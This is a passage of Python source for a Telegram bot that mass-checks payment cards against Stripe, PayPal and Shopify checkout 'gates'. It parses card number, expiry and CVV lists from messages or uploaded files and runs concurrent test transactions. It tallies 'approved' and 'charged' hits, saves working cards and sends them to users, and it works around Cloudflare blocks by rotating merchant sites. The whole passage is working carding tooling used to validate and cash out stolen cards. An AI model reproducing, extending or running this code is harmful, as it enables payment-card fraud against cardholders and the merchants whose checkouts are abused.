        return await event.reply(premium_emoji("𝙁𝙤𝙧𝙢𝙖𝙩. /𝙢𝙘𝙝𝙠 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙩𝙭𝙩 𝙛𝙞𝙡𝙚 / 𝙘𝙖𝙧𝙙 𝙡𝙞𝙨𝙩 𝙬𝙞𝙩𝙝 /𝙢𝙘𝙝𝙠", mode="md"))

    total_cards_found = len(cards)
    if from_file:
        cc_limit = get_cc_limit(access_type, event.sender_id)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(premium_emoji(f"📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚\n⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)", mode="md"))
    elif len(cards) > 20:
        cards = cards[:20]
        await event.reply(premium_emoji(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 20 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {total_cards_found} 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 20 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙧 /𝙢𝙘𝙝𝙠 𝙢𝙨𝙜.```", mode="md"))

    try:
        sender = await event.get_sender()
        name = sender.first_name or "User"
    except:
        name = "User"

    ACTIVE_PROCESSES[event.sender_id] = {
        "name": name,
        "checked": 0,
        "total": len(cards),
        "hits": 0,
        "start_time": time.time()
    }

    task, batch_id = start_batch_task(event.sender_id, process_mchk_cards(event, cards), "mchk", name, "Stripe Auth")
    RUNNING_TASKS[event.sender_id] = task

async def process_mchk_cards(event, cards):
    try:
        sender = await event.get_sender()
        username = sender.first_name or sender.username or f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"

    batch_id = USER_BATCHES.get(event.sender_id, "N/A")
    total = len(cards)
    checked, approved, threeds, declined = 0, 0, 0, 0
    if event.sender_id not in ACTIVE_PROCESSES:
        ACTIVE_PROCESSES[event.sender_id] = {"name": username, "checked": 0, "total": total, "hits": 0, "start_time": time.time()}
    active_data = ACTIVE_PROCESSES[event.sender_id]
    results_for_report = []
    last_card = "N/A"
    last_res = "N/A"
    last_ui_update = 0
    semaphore = asyncio.Semaphore(2)
    status_msg = await event.reply(
        premium_emoji("⏳ <b>Initializing Stripe mass auth session...</b>"),
        parse_mode='html'
    )

    async def throttled_stripe_check(card):
        async with semaphore:
            start_time = time.time()
            result = await check_stripe_card(card, None, SSL_CONTEXT, log_endpoint)
            elapsed_time = round(time.time() - start_time, 2)
            return card, result, elapsed_time

    tasks = [asyncio.create_task(throttled_stripe_check(card)) for card in cards]
    PENDING_SUBTASKS[event.sender_id] = tasks

    for future in asyncio.as_completed(tasks):
        if event.sender_id not in ACTIVE_PROCESSES:
            break
        try:
            card, res, elapsed = await future
            checked += 1
            status_text = str(res.get("Status", "")).lower()
            
            if status_text == "approved":
                approved += 1
                active_data["hits"] += 1
                try:
                    sender = await event.get_sender()
                    name = sender.first_name or "Unknown"
                    await save_approved_card(event.sender_id, name, card, "Approved", res.get('Response'), res.get('Gate'), res.get('Price'))
                    
                    # Send approved card via DM
                    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                    display_response = report_safe_response(res)
                    card_msg = create_premium_gate_layout(
                        "✅", "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿", card, display_response, "Stripe Auth",
                        brand, bin_type, level, bank, country, flag, event.sender_id, name, elapsed
                    )
                    await client.send_message(event.sender_id, premium_emoji(card_msg, mode="md"), file=await _safe_gif(get_gate_gif("Stripe Auth")))
                except: pass
            elif status_text == "3ds required":
                threeds += 1
            else:
                declined += 1

            last_card = card
            last_res = report_safe_response(res)
            active_data["checked"] = checked

            results_for_report.append(f"{card} | {res.get('Status')} | {report_safe_response(res)} | {res.get('Gate')}")

            if checked == 1 or checked == total or (time.time() - last_ui_update) > 2:
                last_ui_update = time.time()
                progress_bar = get_progress_bar(checked, total) if total else get_progress_bar(0, 1)
                last_card_truncated = f"{last_card[:20]}..." if len(last_card) > 20 else last_card
                last_response_clean = f"{last_res[:50]}..." if len(last_res) > 50 else last_res
                progress_text = premium_emoji(
                    f"💎 <b>Stripe Auth Mass Cooking</b>\n\n"
                    f"🎱 <b>Batch ID:</b> {batch_id}\n"
                    f"{progress_bar}\n"
                    f"🔄 <b>Checked:</b> {checked}/{total}\n"
                    f"🔥 <b>Approved:</b> {approved}\n"
                    f"🔐 <b>3DS:</b> {threeds}\n"
                    f"❌ <b>Declined:</b> {declined}\n\n"
                    f"<b>𝗟𝗮𝘀𝘁:</b> <code>{last_card_truncated}</code>\n"
                    f"<b>Ｒ𝗲𝘀:</b> {last_response_clean}"
                )
                buttons = build_mass_progress_buttons(
                    "auth", approved, 0, declined, checked, total,
                    f"stop_mchk:{event.sender_id}".encode()
                )
                try:
                    await status_msg.edit(progress_text, buttons=buttons, parse_mode='html')
                except Exception:
                    pass

        except asyncio.CancelledError:
            break
        except Exception as e:
            checked += 1
            declined += 1
            log_error("MCHK", f"Error checking card: {e}")

    if event.sender_id in PENDING_SUBTASKS:
        pending_tasks = PENDING_SUBTASKS[event.sender_id]
        if pending_tasks:
            for task in pending_tasks:
                task.cancel()
            await asyncio.gather(*pending_tasks, return_exceptions=True)

    report_stream = io.BytesIO()
    report_data = f"📊 MCHK STRIPE AUTH REPORT | Checked: {checked}/{total}\n"
    report_data += f"Status: {'COMPLETED' if checked == total else 'STOPPED'}\n"
    report_data += f"Approved: {approved} | 3DS: {threeds} | Declined: {declined}\n"
    report_data += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    report_data += "\n".join(results_for_report)
    report_stream.write(report_data.encode('utf-8'))
    report_stream.seek(0)
    report_stream.name = "MCHK_Results.txt"

    caption = premium_emoji(f"✅ <b>Stripe Auth Mass Check Complete!</b>\n\n🔥 Approved: {approved}\n🔐 3DS: {threeds}\n❌ Declined: {declined}\n📊 Scanned: {checked}/{total}")
    try:
        await status_msg.delete()
    except:
        pass
    await event.respond(caption, file=report_stream, parse_mode='html')
    ACTIVE_PROCESSES.pop(event.sender_id, None)
    RUNNING_TASKS.pop(event.sender_id, None)

async def process_pp_card(event, access_type):
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: card = extract_card(replied_msg.text)
        if not card: return await event.reply(premium_emoji("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙖𝙩 💎 /𝙥𝙥 4111111111111111|12|2025|123", mode="md"))
    else:
        card = extract_card(event.raw_text)
        if not card: return await event.reply(premium_emoji("𝙁𝙤𝙧𝙢𝙖𝙩 💎 /pp 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤"), parse_mode="html")

    loading_msg = await event.reply(premium_emoji("💎", mode="md"))
    start_time = time.time()

    try:
        res = await check_paypal_card(card, SSL_CONTEXT, log_endpoint)
        elapsed_time = round(time.time() - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        display_response = report_safe_response(res)
        status_text = res.get("Status", "").lower()
        is_charged = False

        if status_text == "maxed out":
            status_result = "Maxed Out"
            display_response = "Retry Maxed Out"
        elif status_text == "charged":
            status_result = "Charged"
            is_charged = True
            sender = await event.get_sender()
            name = sender.first_name or "Unknown"
            await save_approved_card(event.sender_id, name, card, status_result, res.get('Response'), res.get('Gate'), res.get('Price'))
        else:
            status_result = "Declined"

        status_icon = "💰" if is_charged else "❌"
        status_title = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" if is_charged else "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿"
        if status_text == "maxed out":
            status_icon = "⚠️"
            status_title = "𝙍𝙚𝙩𝙧𝙮 𝙈𝙖𝙭𝙚𝙙 𝙊𝙪𝙩"

        sender = await event.get_sender()
        user_name = sender.first_name or "Unknown"

        msg = create_premium_gate_layout(
            status_icon, status_title, card, display_response, "PayPal",
            brand, bin_type, level, bank, country, flag, event.sender_id, user_name, elapsed_time
        )

        await loading_msg.delete()
        gif_url = get_gate_gif("PayPal")
        result_msg = await event.reply(premium_emoji(msg, mode="md"), file=await _safe_gif(gif_url))
        if is_charged: await pin_charged_message(event, result_msg)
    except Exception as e:
        await loading_msg.delete()
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]pp'))
async def pp(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    await enforce_gate_access(event)
    if not await ensure_no_active_batch(event): return
    asyncio.create_task(process_pp_card(event, access_type))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mpp'))
async def mpp(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    await enforce_gate_access(event)

    if not await ensure_no_active_batch(event): return
    cards = []
    from_file = False
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.document:
            from_file = True
            file_path = await replied_msg.download_media()
            try:
                async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    raw_text = await f.read()
            finally:
                try: os.remove(file_path)
                except: pass
            cards = extract_all_cards(raw_text)
        elif replied_msg and replied_msg.text:
            cards = extract_all_cards(replied_msg.text)
    else:
        cards = extract_all_cards(event.raw_text)

    if not cards:
        return await event.reply(premium_emoji("𝙁𝙤𝙧𝙢𝙖𝙩. /𝙢𝙥𝙥 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙩𝙭𝙩 𝙛𝙞𝙡𝙚 / 𝙘𝙖𝙧𝙙 𝙡𝙞𝙨𝙩 𝙬𝙞𝙩𝙝 /𝙢𝙥𝙥", mode="md"))

    total_cards_found = len(cards)
    if from_file:
        cc_limit = 999999999 if is_owner(event.sender_id) else 500
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(premium_emoji(f"📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚\n⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)", mode="md"))
    elif len(cards) > 20:
        cards = cards[:20]
        await event.reply(premium_emoji(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 20 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {total_cards_found} 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 20 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙧 /𝙢𝙥𝙥 𝙢𝙨𝙜.```", mode="md"))

    try:
        sender = await event.get_sender()
        name = sender.first_name or "User"
    except:
        name = "User"

    ACTIVE_PROCESSES[event.sender_id] = {
        "name": name,
        "gate": "PayPal",
        "checked": 0,
        "total": len(cards),
        "hits": 0,
        "start_time": time.time()
    }

    task, batch_id = start_batch_task(event.sender_id, process_mpp_cards(event, cards), "mpp", name, "PayPal")
    RUNNING_TASKS[event.sender_id] = task

async def process_mpp_cards(event, cards):
    try:
        sender = await event.get_sender()
        username = sender.first_name or sender.username or f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"

    batch_id = USER_BATCHES.get(event.sender_id, "N/A")
    total = len(cards)
    checked, approved, charged, declined, maxed_out = 0, 0, 0, 0, 0
    if event.sender_id not in ACTIVE_PROCESSES:
        ACTIVE_PROCESSES[event.sender_id] = {"name": username, "gate": "PayPal", "checked": 0, "total": total, "hits": 0, "start_time": time.time()}
    active_data = ACTIVE_PROCESSES[event.sender_id]
    results_for_report = []
    retry_maxed_report = []
    last_card = "N/A"
    last_res = "N/A"
    last_ui_update = 0
    semaphore = asyncio.Semaphore(10)
    status_msg = await event.reply(premium_emoji(f"💎 <b>PayPal Cooking</b>\n\🎱 <b>Batch ID:</b> <code>{batch_id}</code>\n📊 <b>Total:</b> <code>{total}</code>"), parse_mode='html')

    async def throttled_paypal_check(card):
        async with semaphore:
            start_time = time.time()
            result = await check_paypal_card(card, SSL_CONTEXT, log_endpoint)
            elapsed_time = round(time.time() - start_time, 2)
            return card, result, elapsed_time

    tasks = [asyncio.create_task(throttled_paypal_check(card)) for card in cards]

    try:
        for completed_task in asyncio.as_completed(tasks):
            try:
                card, result, elapsed_time = await completed_task
            except Exception as e:
                card, result, elapsed_time = "Unknown", {"Response": f"Exception: {str(e)}", "Gate": "PayPal", "Status": "Error"}, 0

            checked += 1
            active_data["checked"] = checked
            display_response = report_safe_response(result)
            status_text = result.get("Status", "").lower()
            gate = result.get("Gate", "PayPal")
            last_card = card
            last_res = display_response

            if status_text == "charged":
                charged += 1
                hit_status = "Charged"
                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💰"
            elif status_text == "approved":
                approved += 1
                hit_status = "Approved"
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            else:
                if status_text == "maxed out":
                    maxed_out += 1
                    hit_status = "Maxed Out"
                    retry_maxed_report.append(f"{card} | Retry Maxed Out | {display_response} | {gate}")
                else:
                    declined += 1
                    hit_status = "Declined"
                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"

            results_for_report.append(f"{card} | {hit_status} | {display_response} | {gate}")

            if hit_status in ["Charged", "Approved"]:
                active_data["hits"] = charged + approved
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                await save_approved_card(event.sender_id, username, card, hit_status, result.get('Response'), gate, "-")
                # Premium PayPal Layout with GIF
                status_icon = "💰" if hit_status == "Charged" else "✅"
                status_title = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" if hit_status == "Charged" else "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
                card_msg = create_premium_gate_layout(
                    status_icon, status_title, card, display_response, "PayPal",
                    brand, bin_type, level, bank, country, flag, event.sender_id, username, elapsed_time
                )
                gif_url = get_gate_gif("PayPal")
                result_msg = await event.reply(premium_emoji(card_msg, mode="md"), file=await _safe_gif(gif_url))
                if hit_status == "Charged": await pin_charged_message(event, result_msg)

            if checked == total or (time.time() - last_ui_update) > 3:
                last_ui_update = time.time()
                _bar_size = 10
                _filled = int(_bar_size * checked / total) if total else 0
                progress_bar = f"[{'█' * _filled}{'░' * (_bar_size - _filled)}]"
                percentage = int(100 * checked / total) if total else 0
                last_card_truncated = f"{last_card[:20]}..." if len(last_card) > 20 else last_card
                last_response_clean = f"{last_res[:50]}..." if len(last_res) > 50 else last_res
                progress_text = (
                    f"{premium_emoji('💎')} <b>PayPal Cooking</b>\n\n"
                    f"{premium_emoji('🎱')} <b>Batch ID:</b> {batch_id}\n"
                    f"{progress_bar} {percentage}%\n"
                    f"{premium_emoji('📊')} <b>Checked:</b> {checked}/{total}\n"
                    f"{premium_emoji('🔥')} <b>Approved:</b> {approved}\n"
                    f"{premium_emoji('💰')} <b>Charged:</b> {charged}\n"
                    f"{premium_emoji('❌')} <b>Declined:</b> {declined}\n\n"
                    f"<b>𝗟𝗮𝘀𝘁:</b> <code>{last_card_truncated}</code>\n"
                    f"<b>Ｒ𝗲𝘀:</b> {last_response_clean}"
                )
                buttons = build_mass_progress_buttons(
                    "charging", approved, charged, declined, checked, total,
                    f"stop_mpp:{event.sender_id}".encode()
                )
                try: await status_msg.edit(progress_text, buttons=buttons, parse_mode="html")
                except: pass
    finally:
        pending_tasks = [task for task in tasks if not task.done()]
        if pending_tasks:
            for task in pending_tasks:
                task.cancel()
            await asyncio.gather(*pending_tasks, return_exceptions=True)

        report_stream = io.BytesIO()
        report_data = f"MPP PAYPAL REPORT | Checked: {checked}/{total}\n"
        report_data += f"Status: {'COMPLETED' if checked == total else 'STOPPED'}\n"
        report_data += f"Charged: {charged} | Approved: {approved} | Declined: {declined} | Retry Maxed Out: {maxed_out}\n"
        report_data += "----------------------------------------\n\n"
        report_data += "\n".join(results_for_report)
        report_stream.write(report_data.encode('utf-8'))
        report_stream.seek(0)
        report_stream.name = "MPP_Results.txt"

        retry_stream = None
        if retry_maxed_report:
            retry_stream = io.BytesIO()
            retry_data = f"PAYPAL RETRY MAXED OUT REPORT | Total: {len(retry_maxed_report)}\n"
            retry_data += "----------------------------------------\n\n"
            retry_data += "\n".join(retry_maxed_report)
            retry_stream.write(retry_data.encode("utf-8"))
            retry_stream.seek(0)
            retry_stream.name = "MPP_Retry_Maxed_Out.txt"

        caption = premium_emoji(f"<b>PayPal Mass Check Complete!</b>\n\nCharged: {charged}\nApproved: {approved}\nDeclined: {declined}\nRetry Maxed Out: {maxed_out}\nScanned: {checked}/{total}")
        try:
            await status_msg.delete()
        except:
            pass
        files = [report_stream]
        if retry_stream:
            files.append(retry_stream)
        await event.respond(caption, file=files, parse_mode='html')
        ACTIVE_PROCESSES.pop(event.sender_id, None)
        RUNNING_TASKS.pop(event.sender_id, None)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh'))
async def sh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    await enforce_gate_access(event)
    await enforce_shopify_proxy(event)
    if not await ensure_no_active_batch(event): return
    asyncio.create_task(process_sh_card(event, access_type))

async def process_sh_card(event, access_type):
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: card = extract_card(replied_msg.text)
        if not card: return await event.reply(premium_emoji("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙖𝙩 💎 /𝙨𝙝 4111111111111111|12|2025|123", mode="md"))
    else:
        card = extract_card(event.raw_text)
        if not card: return await event.reply(premium_emoji("𝙁𝙤𝙧𝙢𝙖𝙩 💎 /sh 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤"), parse_mode="html")
    
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: return await event.reply("𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙐𝙍𝙇𝙨. 𝙁𝙞𝙧𝙨𝙩 𝙖𝙙𝙙 𝙪𝙨𝙞𝙣𝙜 /𝙖𝙙𝙙")
    
    loading_msg = await event.reply(premium_emoji("💎", mode="md"))
    start_time = time.time()
    
    try:
        res, site_index = await check_card_random_site(card, user_sites, event.sender_id)
        elapsed_time = round(time.time() - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        
        response_text = res.get("Response", "").lower()
        status_text = res.get("Status", "").lower()
        display_response = report_safe_response(res)
        
        is_charged = False
        charged_keywords = ["charged", "order_paid", "order completed", "order_placed", "order placed", "thank you", "payment successful", "💎"]
        
        if status_text == "maxed out":
            status_header = "⚠️ Retry Maxed Out (5/5)"
            status_result = "Maxed Out"
            display_response = "Retry Maxed Out"
        elif any(key in response_text for key in charged_keywords) or any(key in status_text for key in charged_keywords):
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💰"
            status_result = "Charged"
            is_charged = True
            sender = await event.get_sender()
            name = sender.first_name or "Unknown"
            await save_approved_card(event.sender_id, name, card, status_result, res.get('Response'), res.get('Gate'), res.get('Price'))
        elif "cloudflare bypass failed" in response_text:
            status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
            res["Response"] = "Cloudflare spotted ? change site or try again"
        elif any(key in response_text for key in ["3ds_required", "3ds_authentication", "otp_required", "invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            status_result = "Approved"
            sender = await event.get_sender()
            name = sender.first_name or "Unknown"
            await save_approved_card(event.sender_id, name, card, status_result, res.get('Response'), res.get('Gate'), res.get('Price'))
        elif "captcha_required" in response_text:
            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
            status_result = "Declined"
            display_response = "CARD_DECLINED"
        else:
            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
            status_result = "Declined"

        # Extract sender info for the profile link
        sender = await event.get_sender()
        user_name = sender.first_name or "Unknown"
        user_id = event.sender_id
        price = res.get('Price', '0')

        # Setup status indicators cleanly
        status_icon = "💰" if is_charged else "❌"
        status_title = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" if is_charged else "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿"
        if status_text == "maxed out":
            status_icon = "⚠️"
            status_title = "𝙍𝙚𝙩𝙧𝙮 𝙈𝙖𝙭𝙚𝙙 𝙊𝙪𝙩"
        elif "cloudflare bypass failed" in response_text:
            status_icon = "⚠️"
            status_title = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿"
        elif any(key in response_text for key in ["3ds_required", "3ds_authentication", "otp_required", "invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
            status_icon = "✅"
            status_title = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"

        # Premium Shopify Layout with GIF
        msg = create_premium_gate_layout(
            status_icon, status_title, card, display_response, "Shopify",
            brand, bin_type, level, bank, country, flag, user_id, user_name, elapsed_time,
            price=price
        )
        
        await loading_msg.delete()
        gif_url = get_gate_gif("Shopify")
        result_msg = await event.reply(premium_emoji(msg, mode="md"), file=await _safe_gif(gif_url))
        if is_charged: await pin_charged_message(event, result_msg)
        
    except Exception as e:
        await loading_msg.delete()
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))
        
@client.on(events.NewMessage(pattern=r'(?i)^[/.]msh'))
async def msh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    await enforce_gate_access(event)
    await enforce_shopify_proxy(event)
    
    if not await ensure_no_active_batch(event): return
    
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: cards = extract_all_cards(replied_msg.text)
        if not cards: return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙𝙨 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙖𝙩. /𝙢𝙨𝙝 4111111111111111|12|2025|123 4111111111111111|12|2025|123")
    else:
        cards = extract_all_cards(event.raw_text)
        if not cards: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩. /𝙢𝙨𝙝 4111111111111111|12|2025|123 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙢𝙪𝙡𝙩𝙞𝙥𝙡𝙚 𝙘𝙖𝙧𝙙𝙨")
    if len(cards) > 20:
        cards = cards[:20]
        await event.reply(premium_emoji(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 20 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {len(extract_all_cards(event.raw_text if not event.reply_to_msg_id else replied_msg.text))} 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 20 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙧 /𝙢𝙨𝙝.```", mode="md"))
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: return await event.reply("𝙔𝙤𝙪𝙧 𝘼𝙧𝙚𝙚 𝙣𝙤𝙩 𝘼𝙙𝙙𝙚𝙙 𝘼𝙣𝙮 𝙐𝙧𝙡 𝙁𝙞𝙧𝙨𝙩 𝘼𝙙𝙙 𝙐𝙧𝙡")
    task, batch_id = start_batch_task(event.sender_id, process_msh_cards(event, cards, user_sites), "msh")
    RUNNING_TASKS[event.sender_id] = task

async def process_msh_cards(event, cards, sites):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    batch_id = USER_BATCHES.get(user_id, "N/A")
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    last_ui_update = 0
    last_card = "N/A"
    last_res = "N/A"

    if user_id not in ACTIVE_PROCESSES:
        ACTIVE_PROCESSES[user_id] = {"name": username, "checked": 0, "total": total, "hits": 0, "start_time": time.time()}
    active_data = ACTIVE_PROCESSES[user_id]

    status_msg = await event.reply(premium_emoji(f"💎 <b>Something Big Cooking</b>\n\🎱 <b>Batch ID:</b> <code>{batch_id}</code>\n📊 <b>Total:</b> <code>{total}</code>"), parse_mode='html')
    cards_per_site = 2
    current_site_index = 0
    cards_on_current_site = 0

    batch_size = 10
    try:
        for i in range(0, len(cards), batch_size):
            if user_id not in RUNNING_TASKS:
                break

            batch = cards[i:i+batch_size]
            tasks = []
            task_start_times = []

            for card in batch:
                current_site = sites[current_site_index]
                tasks.append(check_card_specific_site(card, current_site, user_id, all_sites=sites))
                task_start_times.append(time.time())
                cards_on_current_site += 1
                if cards_on_current_site >= cards_per_site:
                    current_site_index = (current_site_index + 1) % len(sites)
                    cards_on_current_site = 0

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, (card, result) in enumerate(zip(batch, results)):
                if user_id not in RUNNING_TASKS:
                    break

                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gate": "-"}

                checked += 1
                active_data["checked"] = checked

                elapsed_time = round(time.time() - task_start_times[j], 2)
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                response_text = result.get("Response", "").lower()
                status_text = result.get("Status", "").lower()
                display_response = report_safe_response(result)
                last_card = card
                last_res = display_response

                is_charged = False
                should_send_message = True
                charged_keywords = ["charged", "order_paid", "order completed", "order_placed", "order placed", "thank you", "payment successful", "💎"]

                if status_text == "maxed out":
                    declined += 1
                    display_response = "Retry Maxed Out"
                elif any(key in response_text for key in charged_keywords) or any(key in status_text for key in charged_keywords):
                    charged += 1
                    is_charged = True
                    sender = await event.get_sender()
                    name = sender.first_name or "Unknown"
                    await save_approved_card(user_id, name, card, "Charged", result.get('Response'), result.get('Gate'), result.get('Price'))
                elif "cloudflare bypass failed" in response_text:
                    declined += 1
                    result["Response"] = "Cloudflare spotted ? change site or try again"
                elif any(key in response_text for key in ["3ds_required", "3ds_authentication", "otp_required", "invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                    approved += 1
                    if is_3ds_required_response(response_text):
